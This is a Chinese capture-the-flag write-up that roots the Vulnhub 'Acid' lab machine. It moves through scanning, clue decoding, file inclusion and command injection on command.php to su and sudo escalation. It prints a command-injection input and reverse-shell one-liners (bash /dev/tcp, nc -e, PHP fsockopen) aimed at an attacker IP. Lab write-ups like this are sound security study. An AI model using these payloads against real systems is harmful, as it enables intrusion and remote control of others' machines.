---
title: Vulnhub-acid
---

# Vulnhub-acid

## 靶机信息

### 下载链接

[https://download.vulnhub.com/acid/Acid.rar](https://download.vulnhub.com/acid/Acid.rar)

### 靶机说明

Welcome to the world of Acid. Fairy tails uses secret keys to open the magical doors.

欢迎来到Acid的世界。童话故事需要使用秘密钥匙打开魔法门。

### 目标

获得root权限和flag。

### 运行环境

靶机：NAT连接，靶机自动获取IP。

攻击机：Widows11，kali linux2021.1

## 信息收集

### 目标发现以及端口服务识别

```shell
#确定目标机IP
nmap -sP 192.168.160.0/24 -oN acid-ip.txt
#确定目标机开放端口以及服务版本
nmap -p1-65535 -sV -oN acid-port.txt 192.168.160.191
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-1.png)

只发现web服务和Apache，只能从web漏洞或者Apache漏洞入手

```shell
Tcp 33447 Apache2.4.10 Ubuntu
```

## 漏洞挖掘

初步探测，该靶机Apache无可直接利用的漏洞，exp也没有，nessus扫描无果，总的来讲，直接一键拿shell不大可能，还是老老实实审计每个页面吧

首先进入该靶机的web界面（33447）端口

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-2.png)

没有什么可点击得，直接F12 审计下，发现一串编码:`0x643239334c6d70775a773d3d`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-3.png)

0x是16进制编码，将值643239334c6d70775a773d3d进行ASCII hex转码，变成：d293LmpwZw==

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-6.png)

发现是base64编码，再进行解码，得到图片信息 wow.jpg

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-7.png)

根据经验在首页直接加目录打：`/image/wow.jpg` 或者 `/images/wow.jpg` 或者 `/icon/wow.jpg` (ps：网站的图片目录通常是这样命名)也可以利用dirbuster进行目录爆破，得到图片目录images

访问 `http://192.168.160.191:33447/images/wow.jpg` 得到图片

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-8.png)

将图片保存并用Notepad++打开，发现最下边有提示`3761656530663664353838656439393035656533376631366137633631306434`进行ASCII hex转码，得到 `7aee0f6d588ed9905ee37f16a7c610d4`，这是一串md5，解密可得63425，推测是一个密码或者ID![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-10.png)

观察首页title可发现一个目录/Challenge

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-4.png)

继续使用Dirbuster进行目录暴破/Challenge该目录下有cake.php、include.php、hacked.php

依此访问3个目录

访问cake.php

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-11.png)

提示我还有很长得路要走，观察页面title，发现有/Magic_Box目录存在

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-12.png)

点击login会跳转到index.php登录页面，需要email和密码才能登录。

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-13.png)

访问include.php，这是一个文件包含漏洞页面，在输入框中输入 /etc/passwd 测试存在文件包含，但遗憾的是没有文件上传点

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-14.png)

访问hacked.php，需要输入ID，测试下之前从wow.jpg解密出来的数字：63425，然后，什么也没有发生

到这里就挺难受的了，一个可利用的点都未发现，对以上发现的页面用avws扫描，无注入无漏洞，该靶机安全？？？

这里想到上面在访问cake.php页面的时候，发现的页面title中的/Magic_Box目录，尝试扫描发现了两个目录low.php和command.php，尝试访问

low.php为空白

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-17.png)

command.php，这里好像存在命令注入

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-16.png)

可执行系统命令，输入`192.168.160.129;id`,查看response发现id命令执行成功，存在命令注入![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-18.png)

尝试利用命令注入反弹shell

kali开启nc，监听4444端口`nc -lvnp 4444`

初次尝试以下payload反弹，都出奇的失败了

```shell
#bash反弹shell
bash -i >& /dev/tcp/192.168.64.1/4444 0>&1
#nc反弹shell
nc -e /bin/bash -d 192.168.64.1 4444
```

水平不够，google来凑，通过php反弹shell成功，将如下payload进行URL编码后，在burp中发送：

```php
php -r '$sock=fsockopen("192.168.64.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-19.png)

kali中nc成功反弹，nc成功接收反弹shelll，但是无法执行su命令，回显su: must be run from a terminal 需要一个终端，这里直接抬一手python反弹交互终端

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

或者

```python
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-20.png)

查看/etc/passwd,发现需要关注的用户有：acid,saman,root

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-21.png)

查找每个用户的文件 `find / -user acid 2>/dev/null`

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-22.png)

发现/sbin/raw_vs_isi/hint.pcapng文件，这是一个网络流量抓包文件，用scp将其拷贝到kali上，并用Wireshark打开

```bash
scp /sbin/raw_vs_isi/hint.pcapng zhiji@192.168.160.129:/root
```

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-23.png)

追踪TCP流，发现saman的密码：1337hax0r

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-24.png)

su提权到saman

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-25.png)

然后sudo -i提权到root

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-26.png)

查看flag

![](https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/vulnhub-acid-28.png)

```shell
You have successfully completed the challenge.
```

您已成功完成挑战。